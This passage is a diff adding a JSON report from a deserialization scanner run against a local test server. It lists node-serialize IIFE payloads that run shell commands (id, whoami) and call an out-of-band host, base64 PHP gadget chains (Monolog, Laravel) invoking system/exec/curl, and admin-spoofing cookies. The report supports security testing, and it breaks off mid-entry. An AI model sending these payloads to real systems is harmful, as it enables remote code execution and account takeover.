@@ -1,0 +1,2842 @@
+{
+  "target": "localhost:8088",
+  "disclaimer": "All findings are Suspected — the tool flags candidates and never auto-confirms; verify each manually.",
+  "stats": {
+    "vectors_scanned": 260,
+    "after_filter": 19,
+    "findings": 19,
+    "dynamic_strong": 1,
+    "oob": {
+      "status": "ran",
+      "collector": "http://172.27.32.1:9000",
+      "base_domain": "oob.test",
+      "tokens_polled": 19,
+      "confirmed": 1
+    }
+  },
+  "findings": [
+    {
+      "url": "http://localhost:8088/api/restore-prefs",
+      "method": "POST",
+      "location": "raw_body",
+      "name": "payload",
+      "occurrences": 1,
+      "oob_token": "d63fa0e5f5e3",
+      "type": "NodeJS",
+      "subtype": "node-serialize RCE",
+      "confidence": "High",
+      "exploit_type": "node-serialize RCE",
+      "suggested_probe": "node_serialize",
+      "severity": "Critical",
+      "severity_note": null,
+      "evidence": "dynamic-strong",
+      "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+      "normalized": [
+        "_$$ND_FUNC$$_function () { return 1; }"
+      ],
+      "mutations_count": 4,
+      "indicators": [
+        "OOB callback received (1 hit(s)) on token d63fa0e5f5e3 — out-of-band interaction observed: the payload was deserialized and triggered an outbound lookup/request (suspected; verify manually — a callback does not by itself prove arbitrary code execution)",
+        "Observation: response length changed by -13 bytes (baseline=91 mutated=78, same status 200) — possible behavioral change, verify manually",
+        "Response content differs in a small, localized way despite same status (similarity=0.86) (baseline='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: [Function (anonymous)] }\"}' mutated='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: undefined }\"}')"
+      ],
+      "attempts": [
+        {
+          "payload_type": "node_serialize_rce",
+          "chain": "node-serialize IIFE",
+          "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+          "signal": "strong",
+          "indicators": [
+            "Observation: response length changed by -13 bytes (baseline=91 mutated=78, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=0.86) (baseline='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: [Function (anonymous)] }\"}' mutated='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: undefined }\"}')"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: undefined }\"}"
+          }
+        },
+        {
+          "payload_type": "node_serialize_rce",
+          "chain": "node-serialize IIFE",
+          "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+          "signal": "strong",
+          "indicators": [
+            "Observation: response length changed by -13 bytes (baseline=91 mutated=78, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=0.86) (baseline='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: [Function (anonymous)] }\"}' mutated='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: undefined }\"}')"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: undefined }\"}"
+          }
+        },
+        {
+          "payload_type": "node_serialize_rce",
+          "chain": "node-serialize IIFE",
+          "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+          "signal": "strong",
+          "indicators": [
+            "Observation: response length changed by -13 bytes (baseline=91 mutated=78, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=0.86) (baseline='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: [Function (anonymous)] }\"}' mutated='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: undefined }\"}')"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: undefined }\"}"
+          }
+        },
+        {
+          "payload_type": "node_serialize_oob",
+          "chain": "node-serialize IIFE: http.get",
+          "payload": "_$$ND_FUNC$$_function(){require('http').get('http://d63fa0e5f5e3.oob.test/');}()",
+          "signal": "strong",
+          "indicators": [
+            "Observation: response length changed by -13 bytes (baseline=91 mutated=78, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=0.86) (baseline='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: [Function (anonymous)] }\"}' mutated='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: undefined }\"}')"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: undefined }\"}"
+          }
+        }
+      ],
+      "oob_confirmed": true
+    },
+    {
+      "url": "http://localhost:8088/api/restore-prefs",
+      "method": "POST",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": "b5e3e6818ae1",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 18,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2I1ZTNlNjgxOGFlMS5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo2OiJzeXN0ZW0iO319fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2I1ZTNlNjgxOGFlMS5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo0OiJleGVjIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2I1ZTNlNjgxOGFlMS5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo4OiJwYXNzdGhydSI7fX19",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjM0OiJjdXJsIGh0dHA6Ly9iNWUzZTY4MThhZTEub29iLnRlc3QvIjt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czozNDoiY3VybCBodHRwOi8vYjVlM2U2ODE4YWUxLm9vYi50ZXN0LyI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6MzQ6ImN1cmwgaHR0cDovL2I1ZTNlNjgxOGFlMS5vb2IudGVzdC8iO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 91,
+            "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8088/api/import-async",
+      "method": "POST",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": "416b25b01e51",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "static-only",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 18,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
